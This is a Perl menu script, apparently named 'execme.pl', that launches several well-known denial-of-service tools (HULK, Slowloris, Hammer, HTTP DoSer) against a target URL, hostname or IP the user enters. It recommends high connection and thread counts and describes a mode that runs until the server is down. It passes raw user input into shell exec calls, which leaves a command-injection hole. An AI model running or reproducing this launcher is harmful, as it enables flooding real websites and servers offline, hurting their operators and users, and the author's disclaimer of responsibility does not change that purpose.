#!/usr/bin/perl
use strict;use warnings;use Term::ANSIScreen qw(cls);use Term::ANSIColor;
sub rerun{
my $clear_screen = cls();print $clear_screen;print color('bright_magenta');print "Re-run the script by 'perl execme.pl'\n";exit;
}
sub Return{
print "Press 1 to return to Main Menu.\n";
my $exit_input = <>;
while ($exit_input == 1){
my $clear_screen = cls();print $clear_screen;exec "perl execme.pl";
}
while ($exit_input ne 1){
rerun();
}
}
sub Mainpage{
my $clear_screen = cls();print $clear_screen;exec "perl execme.pl";
}
sub Control{
my @neededones=("/usr/bin/go", "/usr/bin/python2", "/usr/bin/python3", "/usr/bin/perl", "/usr/bin/bash");
my @dos_tools=("doser/doser.py", "hammer/hammer.py", "hulk/hulk.go", "hulk/hulk.py", "slowloris/pyslowloris/slowloris.py", "slowloris/slowloris.pl/slowloris.pl");print color('white');
print "\nStart when everything is ready!\n";print color('magenta');
print "\nGo is ready!\n" if -e $neededones[0];
print "Python 2 is ready!\n" if -e $neededones[1];
print "Python 3 is ready!\n" if -e $neededones[2];
print "Perl is ready!\n" if -e $neededones[3];
print "Bash is ready!\n" if -e $neededones[4];print color('white');
print "\nGo is not ready.\n" if ! -e $neededones[0];
print "Python 2 is not ready.\n" if ! -e $neededones[1];
print "Python 3 is not ready.\n" if ! -e $neededones[2];
print "Perl is not ready.\n" if ! -e $neededones[3];
print "Bash is not ready.\n" if ! -e $neededones[4];print color ('red');
print "HTTP DoSer is not ready.\n" if ! -e $dos_tools[0];
print "Hammer is not ready.\n" if ! -e $dos_tools[1];
print "HULK (Go) is not ready.\n" if ! -e $dos_tools[2];
print "HULK (Python) is not ready.\n" if ! -e $dos_tools[3];
print "Slowloris (Python) is not ready.\n" if ! -e $dos_tools[4];
print "Slowloris (Perl) is not ready.\n" if ! -e $dos_tools[5];
}
sub termux_control{
print color('white');print "If you executed 'termux-installation.sh' successfully before 'execme.pl', everything is O.K.\n";print color ('bright_red');
Return();
}
print color('yellow');
print"\n\nWelcome to\n";
print color('red');
print"+-+-+-+ +-+-+-+-+-+-+-+-+-+\n";
print"|D|o|S| |F|r|a|m|e|w|o|r|k|\n";
print"+-+-+-+ +-+-+-+-+-+-+-+-+-+\n";
print"\n";
print color('cyan');
print" 1: HTTP Unbearable Loader King (Go)\n";
print" 2: Slowloris (Python)\n";
print" 3: Hammer (Python)\n";
print" 4: Slowloris (Perl)\n";
print" 5: HULK (Python)\n";
print" 6: HTTP DoSer (Python)\n";
print" 7: How to Use\n";
print" 8: About Programs\n";
print" 9: About\n";
print" 0: Exit\n";
print" chkreg: Check requirements if you're in a regular GNU/Linux distribution.\n";
print" chkterm: Check requirements if you're in Termux.\n";
print color('green');
print "Choose your option by pressing numbers or writing commands start with 'chk':\n";
my $choice = <>;chomp $choice;
if ($choice eq 1){
print "Enter the target URL (e.g. https://www.example.com/)\n";
my $hulkurl = <>;
chomp $hulkurl;
print "Wanna use '-safe' option? YES or NO (in capital letters)? If yes, it will terminate itself until the server is down.\n";
my $isitsafe = <>;
chomp $isitsafe;
print "Total connection pool? 4096 is recommended. The default value is 1023.\n";
my $maxprocs = <>;
chomp $maxprocs;
print "String to send? You can create it randomly on your keyboard.\n";
my $senddata = <>;
chomp $senddata;
if ($isitsafe eq "YES"){
print "To stop, please use CTRL+C and re-execute the script.\n";
my $dos0=exec "HULKMAXPROCS=$maxprocs go run hulk/hulk.go -safe -data $senddata -site $hulkurl 2>/dev/null";
chomp $dos0;
}
elsif ($isitsafe eq "NO"){
print "To stop, please use CTRL+C and re-execute the script.\n";
my $dos0=exec "HULKMAXPROCS=$maxprocs go run hulk/hulk.go -data $senddata -site $hulkurl 2>/dev/null";
chomp $dos0;
}
elsif ($isitsafe ne "YES"||"NO"){
rerun();
}
}
elsif ($choice eq 2){
print "Enter the hostname (e.g. example.com):\n";
my $slowpyip = <>;
chomp $slowpyip;
print "To stop, please use CTRL+C and re-execute the script.\n";
my $dos1=exec "python slowloris/pyslowloris/slowloris.py $slowpyip";
chomp $dos1;
}
elsif ($choice eq 3){
print "Enter the IP of server (You can check by 'ping' command.):\n";
my $hammerip = <>;
chomp $hammerip;
print "Enter the port you'll attack (generally and also default 80):\n";
my $hammerport = <>;
chomp $hammerport;
print "Enter the turbo value (Default: 135):\n";
my $turbo = <>;
chomp $turbo;
print "To stop, please use CTRL+C and re-execute the script.\n";
my $dos2=exec "python3 hammer/hammer.py -s $hammerip -p $hammerport -t $turbo";
chomp $dos2;
}
elsif ($choice eq 4){
print "Enter the URL (without http or https, e.g. example.com):\n";
my $dns = <>;
chomp $dns;
print "To stop, please use CTRL+C and re-execute the script.\n";
my $dos3=exec "perl slowloris/slowloris.pl/slowloris.pl -dns $dns";
chomp $dos3;
}
elsif ($choice eq 5){
print "Enter the URL (with http or https, like HULK's Go version):\n";
my $hulkpyurl = <>;
chomp $hulkpyurl;
print "Wanna use 'safe' option? YES or NO (in capital letters)? It will terminate itself until the server is down.\n";
my $isitsafepy = <>;
chomp $isitsafepy;
if ($isitsafepy eq "YES"){
print "To stop, please use CTRL+C and wait until it terminates, then re-execute the script.\n";
my $dos4=exec "python hulk/hulk.py $hulkpyurl safe";
chomp $dos4;
}
elsif ($isitsafepy eq "NO"){
print "To stop, please use CTRL+C and wait until it terminates, then re-execute the script.\n";
my $dos4=exec "python hulk/hulk.py $hulkpyurl";
chomp $dos4;
}
elsif ($isitsafepy ne "YES"||"NO"){
rerun();
}
}
elsif ($choice eq 6){
print color('yellow');print "WARNING:\n";
print "CTRL+C combination doesn't work, you have to 'kill' the process in order to exit. You can learn the PID from 'top'. The process name starts with 'python doser/doser.py...' Also, using lots of threads can stress your CPU, be careful what you do.\n";
print color('green');
print "\nEnter the target URL using apostrophes (e.g. 'http://example.com'):\n";
my $doserurl = <>;chomp $doserurl;
print "Method? GET or POST? Write G or P (Yes, capital letters). By the way POST method is not stable. You can try it manually.\n";
my $method = <>;chomp $method;
print "Numbers of threads? 999 is recommended. Big number will stress your CPU.\n";
my $threadnumber = <>;chomp $threadnumber;
if ($method eq "G"){
print "To stop, please try CTRL+C or kill the process, then re-execute the script to try again.\n";
my $dos5=exec "python doser/doser.py -t $threadnumber -g $doserurl";chomp $dos5;
}
elsif ($method eq "P"){
print "Enter your user agent (example: 'Content-Type: application/json') with apostrophes:\n";
my $doserua = <>;chomp $doserua;
print "Enter your data (For JSON syntax: '{'json': 'payload'}', 'json' and 'payload' should be in quotation marks instead of apostrophes. Use apostrophe around curly braces.):\n";
my $doserdata = <>;chomp $doserdata;
print "To stop, please try CTRL+C or kill the process, then re-execute the script to try again.\n";
my $dos5=exec "python doser/doser.py -t $threadnumber -p $doserurl -ah $doserua -d $doserdata";chomp $dos5;
}
elsif ($method ne "P"||"G"){
rerun();
}
}
elsif ($choice eq 9){
print color('bright_magenta');
print "This program is created for the collection of DoS tools. It can be called 'compilation' too. I am not responsible for the illegal activities you do.\n";print color('bright_red');Return();
}
elsif ($choice eq 8){
print "Here are the Github links:\n";print color('blue');
print "https://github.com/adrianchifor/pyslowloris\n";
print "https://github.com/llaera/slowloris.pl\n";
print "https://github.com/grafov/hulk\n";
print "https://github.com/Electrovirus/Ddos\n";
print "https://github.com/Quitten/doser.py\n";
print color('bright_red');Return();
}
elsif ($choice eq 7){
print color('bright_red');
print "This program directs the 'denial of service' programs to any target according to your input, so it is based on question-answer. If you want, you can use these programs individually with any parameter you want without this perl script. You can think that this program is a front-end work for popular DoS tools and also a collection. Feel free to change, distribute, fork and open an issue.\n\nShortly, 'number or word' + Enter button.\n\n";
print color('blue');Return();
}
elsif ($choice eq 0){
print color ('red');print "\nBye!\n\n";exit;
}
elsif ($choice eq "chkreg"){
Control();Return();
}
elsif ($choice eq "chkterm"){
termux_control();
}
else{
Mainpage();
}
